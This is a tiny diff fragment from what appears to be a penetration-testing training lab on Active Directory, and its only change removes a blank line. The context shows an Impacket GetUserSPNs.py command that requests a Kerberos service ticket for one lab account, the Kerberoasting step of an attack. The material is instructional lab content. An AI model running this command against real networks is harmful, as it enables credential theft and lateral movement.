@@ -57,7 +57,6 @@
         
   #### Requesting a Single TGS ticket
         
-    
         Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
         
         Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
